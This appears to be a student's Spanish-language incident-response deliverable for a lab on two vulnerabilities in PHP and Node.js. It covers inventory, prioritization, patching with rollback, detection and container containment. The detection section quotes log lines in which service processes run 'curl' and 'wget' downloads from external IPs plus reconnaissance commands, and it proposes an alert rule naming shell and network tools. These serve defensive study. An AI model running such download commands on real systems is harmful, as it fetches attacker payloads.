# Entregable — TP PHP2Shell / Node2Shell

**Grupo:** 04 · **Fork del grupo:** https://github.com/LoLoo03/goys-2026-tp-vulnerabilidades · **Rama:** `grupo-04`
**Fecha:** jueves 29/10/2026

| Integrante | Usuario de GitHub | Rol en el TP |
|---|---|---|
| Lorenzo Bellomo | LoLoo3 | Inventario, cambios/parche, detección, contención/comunicación |

> El taller lo ejecutó un solo integrante presente en el aula; por eso concentra los
> cuatro roles. Las horas están en UTC (reloj de Docker); en Argentina son UTC−3.

---

## 1. Inventario

Evidencia: [`capturas/01-inventario-antes.txt`](capturas/01-inventario-antes.txt)
(`docker compose ps` + `./scripts/inventario.sh`, 2026-10-29T22:47:09Z) y
[`capturas/02-detectar.txt`](capturas/02-detectar.txt) (árbol de procesos).

| Activo | Versión | ¿Expuesto a Internet? | ¿Procesa contenido no confiable? | ¿Afectado? | Evidencia |
|--------|---------|:---------------------:|:--------------------------------:|:----------:|-----------|
| Portal PHP (`php-lab`, web01) | PHP 8.3.35, Apache + mod_php | No en el lab / Sí en el despliegue supuesto | Sí: formulario con sesiones y subida de archivos | **Sí** (PHP2Shell, CVE-2026-109618/109619; corregido en 8.3.36) | `PHP 8.3.35 (cli)`; `session.upload_progress.enabled=1`; imagen `php:8.3.35-apache`; `docker top` muestra `apache2 -DFOREGROUND` (master root + workers www-data), sin `php-fpm` |
| API Node.js (`node-lab`, api01) | Node v22.23.3, brotli 1.1.0 (del runtime), Express 5 | No en el lab / Sí en el despliegue supuesto | Sí: `POST /decode` descomprime cuerpos `Content-Encoding: br` de clientes | **Sí** (Node2Shell, CVE-2026-111497; corregido en 22.23.4) | `v22.23.3 / brotli 1.1.0`; `npm ls` sin paquete brotli externo: el decoder lo aporta el runtime |
| Servicio Python (`py-lab`, svc01) | Python 3.11.18, brotli 1.0.9 (PyPI) | No | Parcial: decodifica `br` de lo que le llega por la red interna | **Sí** (CVE-2026-111497; brotli 1.0.3–1.2.0 afectado, corregido en 1.2.1) | `brotli 1.0.9` |

**SAPI de PHP.** `inventario.sh` corre `php -v` por CLI, así que muestra `(cli)`. El
SAPI web se deduce de la imagen `-apache` y del árbol de procesos: solo hay
`apache2`, sin `php-fpm`, por lo tanto PHP corre como módulo de Apache (mod_php), el
caso de **mayor riesgo** según el aviso: el ataque ocurre antes de que corra la app.
No imprimimos el SAPI web directamente (la página `index.php` lo muestra, pero no hay
puertos publicados y la guía no incluye un comando para pedirla).

**Brotli en Node: el string no alcanza como evidencia.** El runtime informa brotli
1.1.0 en la versión vulnerable y sigue informando 1.1.0 en la corregida
(ver sección 3). La señal válida es la versión de Node (22.23.4), no el string.

**Supuestos de exposición:**

- En el laboratorio ningún servicio está expuesto: no hay `ports:` publicados y la red
  `labnet` es `internal: true` (verificado en sección 5).
- En el despliegue real que simula el lab suponemos que el **portal PHP** está
  publicado a Internet (es un portal de legajos con subida de archivos) y que la
  **API Node** recibe cuerpos de clientes externos detrás de un proxy que **no**
  descomprime ni filtra `Content-Encoding: br`. El **servicio Python** es interno y
  solo recibe tráfico de otros servicios.
- Si el proxy descomprimiera Brotli, el proxy pasaría a ser el activo afectado
  (Envoy/Istio están en la lista del aviso) y habría que inventariarlo.
- El log de la sección 4 menciona un host **db01** que no está en este inventario:
  es un activo sin relevar.

**Ajuste de entorno (declarado):** el equipo donde corre el laboratorio tiene
Kaspersky Endpoint Security, que intercepta HTTPS y re-firma los certificados con su
propia CA (*Kaspersky Endpoint Security Personal Certification Authority*). Windows
confía en esa CA, pero los contenedores no, así que `./scripts/arrancar-2h.sh`
falló al construir la imagen de Node (`npm install` → `SELF_SIGNED_CERT_IN_CHAIN`).
Cambiar de red no lo resolvió, porque la intercepción ocurre en el propio equipo.
Las imágenes `goys-vuln-lab-node` se construyeron con una copia del `Dockerfile` de
la cátedra que solo agrega esa CA durante `npm install` (ver sección 3). No se
modificó `docker-compose.yml`, el código del laboratorio, `docs/` ni `recursos/`.
Las imágenes de PHP y Python se obtuvieron sin cambios.

---

## 2. Priorización y decisión

| Activo | CVSS | Explotación real | Exposición | Criticidad | Decisión y plazo |
|--------|:----:|:----------------:|:----------:|:----------:|------------------|
| Portal PHP | 9.2 (CVSS 4.0) | **Sí**: confirmada, en CISA KEV desde 26/10 | Alta (supuesto: publicado, mod_php) | Alta: datos de legajos de personal | **1.º — Ya.** Mitigación inmediata (`upload_progress = 0`) y parche a 8.3.36 en ventana de emergencia, **< 24 h** |
| API Node.js | 9.2 (Google, CNA) / High (Node.js) | No confirmada al 27/10; RCE demostrado en laboratorio | Alta (supuesto: recibe `br` de clientes; Express 5 descomprime) | Media-alta | **2.º — < 72 h.** Parche a 22.23.4 en ventana de cambio; mientras tanto, rechazar `Content-Encoding: br` en el proxy |
| Servicio Python | 9.2 (mismo CVE) | No confirmada | Baja: solo red interna | Media | **3.º — ventana estándar, ≤ 7 días.** Actualizar brotli a 1.2.1 |

**Justificación:** el orden no sale del CVSS (los tres tienen 9.2) sino de la
**explotación real** y la **exposición**. PHP2Shell está en KEV y se explota desde
antes del disclose; con mod_php no importa qué hace la app. Node2Shell tiene el mismo
puntaje pero todavía no hay explotación maliciosa confirmada, y la API se puede
proteger mientras tanto filtrando Brotli en el borde. El servicio Python comparte el
CVE pero no recibe tráfico externo: para llegar a él, el atacante primero tiene que
estar adentro.

**Qué evidencia cambiaría el orden:**

- Node2Shell entra en KEV, aparece un exploit público o se confirma explotación →
  la API pasa a emergencia (< 24 h), igual que PHP.
- Se descubre que el proxy o algún cliente interno reenvía cuerpos `br` externos al
  servicio Python → sube a la prioridad de la API.
- El log de la sección 4 (procesos hijos de `python` en svc01) indica actividad en el
  servicio interno: si se confirma, svc01 deja de ser "solo interno" y se trata como
  comprometido, no como un activo que solo espera el parche.

En el laboratorio, como el costo era bajo y no hay usuarios reales, aplicamos los tres
parches en la misma sesión; el orden de arriba es el que aplicaríamos en producción.

---

## 3. Mitigación, parche y reversión

| Fecha/hora (UTC) | Activo | Cambio | Antes | Después | Reversión |
|------------|--------|--------|-------|---------|-----------|
| 29/10/2026, antes del taller | Entorno (build de API Node.js) | Build de `goys-vuln-lab-node:22.23.3-bookworm-slim` y `:22.23.4-bookworm-slim` con un `Dockerfile` temporal que confía en la CA de Kaspersky (comando abajo) | `npm install` fallaba con `SELF_SIGNED_CERT_IN_CHAIN`; el lab no arrancaba | `./scripts/arrancar-2h.sh`: `php-lab`, `node-lab` y `py-lab` en `healthy`; inventario: PHP 8.3.35, Node v22.23.3 / brotli 1.1.0, Python brotli 1.0.9 | `docker rmi goys-vuln-lab-node:22.23.3-bookworm-slim goys-vuln-lab-node:22.23.4-bookworm-slim` y reconstruir con `docker compose --env-file versions.env build` en un equipo sin intercepción HTTPS |
| 2026-10-29 22:47:58Z | Portal PHP | **Mitigación:** `laboratorio/php/php.ini`: `session.upload_progress.enabled = 1` → `0`; `docker compose restart php-lab` | `session.upload_progress.enabled=1` | `session.upload_progress.enabled=0`; `php-lab` `healthy` a los 8 s ([`04-mitigacion-php.txt`](capturas/04-mitigacion-php.txt)) | Volver la línea a `1` y `docker compose restart php-lab` |
| 2026-10-29 22:48:26Z | Los tres | **Intento de parche** con `./scripts/parchear.sh` | Versiones vulnerables | **Falló** el rebuild de Node por la intercepción de Kaspersky (`SELF_SIGNED_CERT_IN_CHAIN`); no se recreó ningún contenedor ([`05-parchear-intento.txt`](capturas/05-parchear-intento.txt)) | No aplica: no cambió nada |
| 2026-10-29 22:53:11Z | Los tres | **Parche** con las mismas variables que `parchear.sh`, sin reconstruir Node (comando abajo) | PHP 8.3.35, Node v22.23.3, brotli (Py) 1.0.9 | PHP **8.3.36**, Node **v22.23.4**, brotli (Py) **1.2.1**; los 3 `healthy`; la mitigación de PHP sigue en `0` ([`06-parche-despues.txt`](capturas/06-parche-despues.txt)) | `docker compose --env-file versions.env up -d --wait`: `versions.env` vuelve a las versiones anteriores, cuyas imágenes siguen en el equipo. Mantener `upload_progress = 0` mientras se esté en la versión vieja |

**Parche aplicado (equivalente a `parchear.sh`).** `parchear.sh` exporta
`PHP_TAG=8.3.36-apache`, `NODE_TAG=22.23.4-bookworm-slim` y `BROTLI_VERSION=1.2.1` y
corre `docker compose --env-file versions.env up -d --build`. El `--build` vuelve a
construir Node con el `Dockerfile` original, que falla en este equipo. Se usaron las
mismas variables, se construyó solo Python y se levantó sin `--build`, usando la
imagen de Node 22.23.4 ya construida con el ajuste de Kaspersky:

```bash
export PHP_TAG=8.3.36-apache NODE_TAG=22.23.4-bookworm-slim BROTLI_VERSION=1.2.1
docker compose --env-file versions.env build py-lab
docker compose --env-file versions.env up -d --wait
./scripts/inventario.sh
```

**Ventana de cambio.** En el lab, el corte fue de unos segundos por servicio
(recreación de contenedores). En producción, PHP va en ventana de emergencia el mismo
día; Node en la próxima ventana dentro de 72 h; Python en la ventana semanal.

**Detalle del ajuste de entorno (Kaspersky).** La CA se exportó del almacén de
certificados raíz de Windows a un archivo PEM (`kaspersky-ca.crt`) fuera del repo.
No se commitea: es específica de este equipo. El `Dockerfile` temporal, también fuera
del repo, es el de `laboratorio/node/Dockerfile` con una sola diferencia en el paso
de `npm install`:

```dockerfile
ARG NODE_TAG=22.23.3-bookworm-slim
FROM node:${NODE_TAG}

WORKDIR /app

COPY package.json ./
COPY --from=ca kaspersky-ca.crt /tmp/kaspersky-ca.crt
RUN NODE_EXTRA_CA_CERTS=/tmp/kaspersky-ca.crt npm install --omit=dev && rm /tmp/kaspersky-ca.crt

COPY server.js ./

USER node
EXPOSE 3000
CMD ["node", "server.js"]
```

Comando, desde `laboratorio/`, una vez por versión (`22.23.3-bookworm-slim` y
`22.23.4-bookworm-slim`):

```bash
docker buildx build --load -f <dir-temporal>/Dockerfile.kaspersky \
  --build-context ca=<dir-temporal> \
  --build-arg NODE_TAG=<version> \
  -t goys-vuln-lab-node:<version> ./node
```

La verificación TLS no se desactivó: npm sigue validando el certificado, pero contra
la CA de Kaspersky. La CA se borra de la imagen al terminar la instalación.

**Prueba funcional mínima:** después de la mitigación y después del parche, los tres
servicios pasaron su healthcheck (`docker compose ps` → `healthy`), que es una prueba
funcional real de cada app y no solo del contenedor:

- PHP: abre una conexión a `127.0.0.1:80` (Apache atiende).
- Node: `fetch('http://127.0.0.1:3000/')` y exige respuesta `ok` (Express responde).
- Python: `urlopen('http://127.0.0.1:8000/')` (el servidor HTTP responde).

**Qué no se pudo probar:**

- Que la mitigación y el parche **cierren** la vulnerabilidad: no se ejecutan PoCs.
  Lo verificado es la versión y la configuración, que es lo que indica el aviso.
- El formulario de subida de PHP y `POST /decode` con un cuerpo Brotli benigno: la
  guía no trae un comando para eso y los servicios no publican puertos. El healthcheck
  solo prueba la ruta `/`.
- Que la mitigación de PHP no rompa una funcionalidad: la app del lab no usa la barra
  de progreso de subida; en una app real habría que revisarlo.
- Que las imágenes de Node construidas con el `Dockerfile` de la cátedra, sin el
  ajuste de Kaspersky, se comporten igual. En este equipo ese build falla. La
  diferencia esperada es nula: el ajuste solo cambia en qué CA confía npm al bajar
  `express`.

---

## 4. Detección y caza

Resumen; el análisis completo está en [`deteccion.md`](deteccion.md). Evidencia:
[`capturas/02-detectar.txt`](capturas/02-detectar.txt).

**Hipótesis:** si PHP2Shell o Node2Shell se explotaron, en web01, api01 o svc01 vamos
a ver al proceso del servicio (`apache2`, `node`, `python`) lanzando un shell o un
descargador (`sh`, `bash`, `curl`, `wget`, `nc`) a partir del 21/10, con comandos de
reconocimiento (`id`, `uname`) o URLs a IPs externas.

**Hallazgos en `audit.log`:**

| Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
|-------------------|------|--------------|:---------:|---------|
| 2026-10-27T09:42:17Z / :18Z | web01 | `apache2` → `sh -c id` → `id` | **Sí** | Un worker de Apache no lanza shells; `id` es el primer comando típico después de un RCE |
| 2026-10-27T09:43:03Z / :04Z | api01 | `node` → `sh -c curl http://198.51.100.7/x` → `curl` | **Sí** | La API no usa `child_process`; descarga desde una IP externa |
| 2026-10-27T09:44:22Z | web01 | `apache2` → `wget http://198.51.100.9/a` | **Sí** | Segunda descarga desde web01, a otra IP externa |
| 2026-10-27T09:45:10Z / :11Z | svc01 | `python` → `sh -c uname -a` → `uname` | **Sí** | Reconocimiento en el servicio **interno**: posible movimiento lateral |
| 09:42:40Z, 09:44:10Z, 09:49:00Z | db01 | `sshd` → `-bash` | Indeterminado | Puede ser una sesión administrativa; coincide con la ventana del ataque y db01 no está inventariado |
| 09:45:00Z, 09:47:00Z / 09:43:40Z | api01 / svc01 | `node` → `node server.js` / `python` → `python app.py` | No (baja) | Mismo binario y argumentos del servicio: compatible con un reinicio o supervisor |

**¿Hay compromiso?** Sí en web01, api01 y svc01: hay ejecución de comandos desde los
procesos de los servicios, en 3 minutos (09:42–09:45), con una secuencia típica de
post-explotación (identidad → descarga → descarga → reconocimiento). El **alcance** es
indeterminado: el log no muestra si las descargas tuvieron éxito, qué se ejecutó
después, ni quién abrió las sesiones en db01.

**Regla propuesta para Node.js:** alertar cuando un proceso con padre `node` ejecuta
`sh`, `bash`, `dash`, `curl`, `wget` o `nc` en api01 (la API nunca lanza procesos, así
que no hay excepciones legítimas). Falso negativo: un payload que trabaja en memoria
con `fetch`/`net` de Node sin crear procesos, o que usa otro binario (`python`, un
`busybox` renombrado).

**Limitaciones del log:** no trae usuario/UID ni IP de origen de la conexión, ni
resultado del comando; cubre solo 9 minutos del 27/10 (nada desde el 17/10, cuando
empezaron los intentos); no hay telemetría de red para ver si la salida a
`198.51.100.x` funcionó.

**Árbol de procesos actual del lab:** sin hijos sospechosos. En `node-lab` aparece
`node -e fetch(...)`, pero es el healthcheck de Docker: su padre es el runtime del
contenedor, no `node server.js`, así que la regla no lo dispara
([`07-contencion-y-procesos-despues.txt`](capturas/07-contencion-y-procesos-despues.txt)).

---

## 5. Contención

Evidencia: [`capturas/03-contencion-antes.txt`](capturas/03-contencion-antes.txt) y
[`capturas/07-contencion-y-procesos-despues.txt`](capturas/07-contencion-y-procesos-despues.txt)
(`./scripts/verificar-contencion.sh`, `docker compose config`, `./scripts/detectar.sh`).

| Control | Configuración | Evidencia | ¿Funciona? | Qué daño evita |
|---------|---------------|-----------|:----------:|----------------|
| Red sin salida | `networks.labnet.internal: true`, sin `ports:` | `SIN SALIDA` en PHP, Node (`TypeError`) y Python (`URLError`), antes y después del parche | **Sí** | Las descargas de segunda etapa (`curl`/`wget` a 198.51.100.x como en el log) y la exfiltración o el C2 fallan |
| Usuario sin privilegios | `user: node` (Node), `user: nobody` (Python); Apache: master `root`, workers `www-data` | `docker top`: `node` con UID 1000, `python` como `nobody`, workers `apache2` como `www-data` | **Sí** (Node, Python) / Parcial (PHP) | Un RCE corre sin root: no puede leer archivos de otros usuarios ni cambiar configuración del sistema. En PHP el master sigue siendo root |
| Filesystem read-only | `read_only: true` + `tmpfs` solo en `/tmp` (y rutas de Apache) | `read_only: true` en los 3 servicios en `docker compose config`; código de PHP montado `:ro` | **Sí** (declarado) | No se puede modificar el código ni dejar un webshell persistente; lo que se escriba en `tmpfs` desaparece al reiniciar |
| Capabilities mínimas | `cap_drop: ALL`; PHP recupera solo `CHOWN`, `SETUID`, `SETGID`, `DAC_OVERRIDE`, `NET_BIND_SERVICE`; `no-new-privileges:true` | `docker compose config` | **Sí** (declarado) | Sin capacidades de red cruda, montaje ni administración; `no-new-privileges` bloquea escalar con binarios setuid |
| Límites de memoria/PIDs | `mem_limit` 256 MB (PHP, Node) / 128 MB (Python); `pids_limit` 100 / 100 / 50 | `docker compose config` | **Sí** (declarado) | Acota minería, fork bombs y que un contenedor comprometido tumbe al host |
| Rechazo de Brotli innecesario | No configurado: `POST /decode` acepta `Content-Encoding: br` | `node/server.js` decodifica `br` explícitamente | **No** | Control propuesto: rechazar `br` en el proxy (o en Express) mientras no se parchee. Cortaría el camino de entrada de Node2Shell |

**Prueba de salida a Internet:** falla en los tres servicios, antes y después del
parche: PHP `SIN SALIDA`, Node `SIN SALIDA TypeError`, Python `SIN SALIDA URLError`.

**Riesgo residual y límites de lo verificado:**

- `read_only`, capabilities y límites están **verificados en la configuración**
  (`docker compose config`), no con una prueba que intente escribir o agotar memoria:
  la guía no trae ese comando.
- La red interna corta la salida, pero **no** el movimiento lateral entre los tres
  servicios dentro de `labnet` (el caso de svc01 en el log).
- El master de Apache corre como root y PHP conserva 5 capabilities: es el
  contenedor menos contenido y, a la vez, el más atacado.

**Control extra que agregaríamos:** separar la red en dos (pública para PHP/Node e
interna para Python) y permitir solo el tráfico necesario entre ellas. Evita que un
RCE en el portal llegue directo al servicio interno.

---

## 6. Conclusión (5 líneas)

1. En las primeras 2 horas, mitigaríamos PHP antes de cualquier otra cosa: es un
   cambio de una línea, reversible, y PHP2Shell ya se explota.
2. Inventariaríamos dependencias transitivas y proxies, no solo runtimes: Brotli llega
   por Node, Express, `fetch` y Envoy aunque nadie lo importe.
3. Usaríamos la versión del runtime como evidencia, no el string de Brotli, que no
   cambia con el parche.
4. Cazaríamos desde el 17/10 y no desde el disclose, y declararíamos db01 como activo
   sin relevar.
5. Probaríamos antes el pipeline de build: la intercepción de HTTPS en el equipo nos
   frenó el arranque y el parche, y en una emergencia eso es tiempo perdido.

---

## 7. Checklist antes de entregar

- [x] El laboratorio arrancó y los 3 servicios quedaron `healthy`.
- [x] Inventario con evidencia (versión, SAPI, configuración).
- [x] Matriz con decisión y plazo.
- [x] Parche aplicado y verificado; reversión documentada.
- [x] Al menos 3 controles de contención probados.
- [x] `deteccion.md` completo.
- [x] `informe.md` individual completo.
- [x] Sin claves, tokens ni placeholders.
- [ ] Repo pusheado y PR abierto.

Checklist completa: [`../docs/checklist-entrega.md`](../docs/checklist-entrega.md).
